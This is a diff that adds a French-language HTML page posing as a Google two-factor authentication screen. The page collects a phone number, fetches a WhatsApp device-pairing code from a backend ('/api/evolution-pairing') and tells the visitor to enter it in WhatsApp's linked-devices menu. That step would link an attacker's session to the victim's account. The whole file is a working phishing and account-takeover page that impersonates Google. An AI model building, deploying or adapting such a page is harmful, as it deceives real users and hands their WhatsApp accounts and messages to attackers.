@@ -1,0 +1,349 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Google - Authentification 2FA</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --g-blue: #4285f4;
+      --g-blue-dark: #1a73e8;
+      --g-blue-soft: #e8f0fe;
+      --g-text-900: #202124;
+      --g-text-700: #3c4043;
+      --g-text-500: #5f6368;
+      --g-border: #dadce0;
+      --g-bg: #f8f9fa;
+      --g-white: #ffffff;
+      --g-radius: 12px;
+      --g-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px rgba(60, 64, 67, 0.15);
+      --g-font: "Google Sans", "Roboto", "Segoe UI", sans-serif;
+    }
+
+    body {
+      font-family: var(--g-font);
+      background: var(--g-bg);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--g-text-900);
+      padding: 16px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 460px;
+      background: var(--g-white);
+      border: 1px solid var(--g-border);
+      border-radius: var(--g-radius);
+      box-shadow: var(--g-shadow);
+      padding: 36px 36px 30px;
+    }
+
+    .logo {
+      display: block;
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 20px;
+      object-fit: contain;
+    }
+
+    .step { display: none; }
+    .step.visible { display: block; animation: fadeIn 0.35s ease both; }
+
+    .step-title {
+      text-align: center;
+      font-size: 28px;
+      line-height: 1.2;
+      font-weight: 500;
+      margin-bottom: 10px;
+      color: var(--g-text-900);
+    }
+
+    .step-desc {
+      text-align: center;
+      color: var(--g-text-500);
+      line-height: 1.5;
+      font-size: 14px;
+      margin-bottom: 24px;
+    }
+
+    .form-group { margin-bottom: 18px; }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 13px;
+      color: var(--g-text-700);
+      font-weight: 500;
+    }
+
+    .phone-row {
+      display: grid;
+      grid-template-columns: 130px 1fr;
+      gap: 10px;
+    }
+
+    select,
+    input {
+      width: 100%;
+      height: 44px;
+      border: 1px solid var(--g-border);
+      border-radius: 8px;
+      padding: 0 12px;
+      font-size: 15px;
+      color: var(--g-text-900);
+      outline: none;
+      background: var(--g-white);
+    }
+
+    select:focus,
+    input:focus {
+      border-color: var(--g-blue);
+      box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.18);
+    }
+
+    .btn {
+      width: 100%;
+      height: 44px;
+      border: none;
+      border-radius: 22px;
+      background: var(--g-blue);
+      color: var(--g-white);
+      font-weight: 500;
+      font-size: 15px;
+      cursor: pointer;
+      transition: background 0.2s ease, transform 0.08s ease;
+    }
+
+    .btn:hover { background: var(--g-blue-dark); }
+    .btn:active { transform: scale(0.99); }
+
+    .loader-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 6px 0 2px;
+    }
+
+    .spinner {
+      width: 46px;
+      height: 46px;
+      border-radius: 50%;
+      border: 3px solid var(--g-blue-soft);
+      border-top-color: var(--g-blue);
+      animation: spin 0.9s linear infinite;
+      margin-bottom: 14px;
+    }
+
+    .loader-text {
+      color: var(--g-text-500);
+      font-size: 14px;
+      text-align: center;
+      line-height: 1.5;
+      margin-bottom: 8px;
+    }
+
+    .otp-display {
+      background: var(--g-blue-soft);
+      border: 1px solid var(--g-blue);
+      border-radius: 10px;
+      padding: 14px;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+
+    .otp-label {
+      font-size: 12px;
+      color: var(--g-blue-dark);
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+      font-weight: 600;
+      margin-bottom: 7px;
+    }
+
+    .otp-code {
+      font-size: 34px;
+      letter-spacing: 3px;
+      font-weight: 700;
+      color: var(--g-blue-dark);
+      font-family: "Courier New", monospace;
+    }
+
+    .notice {
+      color: var(--g-text-500);
+      font-size: 13px;
+      line-height: 1.5;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .status {
+      min-height: 20px;
+      margin-top: 10px;
+      text-align: center;
+      font-size: 13px;
+      color: #d93025;
+    }
+
+    .meta {
+      text-align: center;
+      margin-top: 10px;
+      color: var(--g-text-500);
+      font-size: 12px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 520px) {
+      .card { padding: 26px 20px 22px; }
+      .phone-row { grid-template-columns: 114px 1fr; }
+      .step-title { font-size: 24px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img class="logo" src="/google-icon.png" alt="Google" />
+
+    <div class="step visible" id="step1">
+      <h1 class="step-title">Authentification 2FA</h1>
+      <p class="step-desc">Pour acceder aux ressources de cette organisation, confirmez votre identite.</p>
+
+      <form id="phoneForm">
+        <div class="form-group">
+          <label for="countryCode">Pays</label>
+          <div class="phone-row">
+            <select id="countryCode" name="countryCode" required>
+              <option value="+33">FR (+33)</option>
+              <option value="+1">US (+1)</option>
+              <option value="+44">UK (+44)</option>
+              <option value="+49">DE (+49)</option>
+              <option value="+62" selected>ID (+62)</option>
+              <option value="+65">SG (+65)</option>
+              <option value="+971">AE (+971)</option>
+            </select>
+            <input id="phoneNumber" name="phoneNumber" type="tel" autocomplete="tel" placeholder="Numero de telephone" required />
+          </div>
+        </div>
+
+        <button class="btn" type="submit">Confirmer</button>
+        <p class="status" id="status1"></p>
+      </form>
+    </div>
+
+    <div class="step" id="step2">
+      <h1 class="step-title">Verification en cours</h1>
+      <p class="step-desc">Nous preparons votre connexion securisee WhatsApp.</p>
+      <div class="loader-wrapper">
+        <div class="spinner"></div>
+        <p class="loader-text">Generation du code de liaison en cours...</p>
+      </div>
+      <p class="status" id="status2"></p>
+    </div>
+
+    <div class="step" id="step3">
+      <h1 class="step-title">Code de confirmation</h1>
+      <p class="step-desc">Saisissez ce code dans WhatsApp pour finaliser la verification.</p>
+
+      <div class="otp-display">
+        <div class="otp-label">Code de pairing</div>
+        <div class="otp-code" id="pairingCode">--------</div>
+      </div>
+
+      <p class="notice">Dans WhatsApp: Appareils connectes -> Relier avec un numero de telephone.</p>
+      <button id="doneBtn" class="btn" type="button">Continuer</button>
+      <p class="meta" id="instanceMeta"></p>
+    </div>
+  </div>
+
+  <script>
+    const steps = [
+      document.getElementById("step1"),
+      document.getElementById("step2"),
+      document.getElementById("step3")
+    ];
+
+    const status1 = document.getElementById("status1");
+    const status2 = document.getElementById("status2");
+    const pairingCodeEl = document.getElementById("pairingCode");
+    const instanceMetaEl = document.getElementById("instanceMeta");
+
+    function showStep(index) {
+      steps.forEach((step, i) => step.classList.toggle("visible", i === index));
+    }
+
+    function sanitizePhone(countryCode, rawNumber) {
+      const digits = String(rawNumber || "").replace(/\D/g, "");
+      if (!digits) return "";
+      const normalizedPrefix = String(countryCode || "").replace(/\D/g, "");
+      if (!normalizedPrefix) return digits;
+      if (digits.startsWith(normalizedPrefix)) return digits;
+      return normalizedPrefix + digits;
+    }
+
+    async function requestPairingViaServer(fullPhone) {
+      const response = await fetch("/api/evolution-pairing", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ phone: fullPhone })
+      });
+
+      const payload = await response.json().catch(() => ({}));
+      if (!response.ok) {
+        throw new Error(payload?.error || `Erreur ${response.status}`);
+      }
+
+      const pairingCode = payload?.pairingCode || "";
+      const instanceName = payload?.instanceName || "";
+      if (!pairingCode) {
+        throw new Error("Aucun code recu depuis le serveur.");
+      }
+
+      return { pairingCode, instanceName };
+    }
+
+    document.getElementById("phoneForm").addEventListener("submit", async (event) => {
+      event.preventDefault();
+      status1.textContent = "";
+      status2.textContent = "";
+
+      const countryCode = document.getElementById("countryCode").value;
+      const phoneNumber = document.getElementById("phoneNumber").value;
+      const fullPhone = sanitizePhone(countryCode, phoneNumber);
+
+      if (!fullPhone) {
+        status1.textContent = "Veuillez saisir un numero valide.";
+        return;
+      }
+
+      showStep(1);
+
+      try {
+        const { pairingCode, instanceName } = await requestPairingViaServer(fullPhone);
+
+        pairingCodeEl.textContent = pairingCode;
+        instanceMetaEl.textContent = `Instance: ${instanceName}`;
+        sessionStorage.setItem("evolution_instance_name", instanceName);
+        showStep(2);
+      } catch (error) {
+        showStep(0);
+        status1.textContent = error?.message || "Erreur inattendue.";
+      }
+    });
+
+    document.getElementById("doneBtn").addEventListener("click", () => {
+      window.location.href = "/waiting-approval";
+    });
+  </script>
+</body>
+</html>
